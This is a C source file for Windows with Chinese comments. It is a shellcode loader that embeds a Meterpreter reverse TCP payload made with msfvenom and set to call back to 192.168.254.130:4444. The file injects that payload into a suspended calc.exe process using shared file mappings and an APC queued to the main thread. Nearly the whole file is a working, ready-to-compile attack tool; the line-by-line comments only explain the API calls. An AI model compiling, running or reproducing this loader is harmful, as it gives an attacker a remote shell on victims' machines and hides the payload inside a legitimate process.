#include <windows.h>
#include <stdio.h>
#pragma comment (lib, "OneCore.lib")
//引用MapViewOfFile2

//msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.254.130 lport=4444 -f c
unsigned char shellcode[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54"
"\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xfe\x82"
"\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5"
"\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67"
"\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00"
"\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56"
"\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58"
"\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5"
"\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85"
"\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1"
"\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

int main() {
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(STARTUPINFO);

	//创建大小为sizeof(shellcode)的文件映射内核对象，并返回一个用来标识所创建的文件映射对象的句柄
	HANDLE hMapping = CreateFileMapping(
		INVALID_HANDLE_VALUE, //使用INVALID_HANDLE_VALUE时
		NULL, //该结构确定子进程是否可以继承返回的句柄
		PAGE_EXECUTE_READWRITE, //指定文件映射对象的页面保护
		0, //高位文件大小
		sizeof(shellcode), //低位文件大小
		NULL//文件映射对象的名称
	);

	//将地址映射到当前进程的地址空间中，返回值为进程空间的起始地址
	LPVOID lpMapAddress = MapViewOfFile(
		hMapping, //handle句柄
		FILE_MAP_WRITE, //对文件映射对象的访问类型
		0, //高阶
		0, //低阶
		sizeof(shellcode)//映射到进程内存空间的文件映射的字节数
	);

	//将shellcode复制到当前进程的虚拟地址空间中
	memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));

	//创建calc.exe进程
	CreateProcessA(
		"C:\\Windows\\System32\\calc.exe", //要执行的模块的名称
		NULL, //要执行的命令行
		NULL, //进程安全描述符
		NULL, //线程安全描述符
		TRUE, //决定子进程是否继承父进程句柄表中的"可继承句柄"
		CREATE_SUSPENDED | CREATE_NO_WINDOW, //创建的状态CREATE_SUSPENDED标识挂起的状态下创建
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si, //pStartupInfo结构指针
		&pi//PROCESS_INFORMATION结构的指针
	);

	//
	LPVOID lpMapAddressRemote = MapViewOfFile2(
		hMapping, //createfilemapping的返回值句柄
		pi.hProcess, //进程句柄
		0,
		NULL,
		0,
		0,
		PAGE_EXECUTE_READ
	);

	//将lpMapAddressRemote指向的函数加入到pi.hThread(也就是calc.exe的主线程)的APC队列中
	QueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, NULL);

	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	CloseHandle(hMapping);
	UnmapViewOfFile(lpMapAddress);
	return 0;
}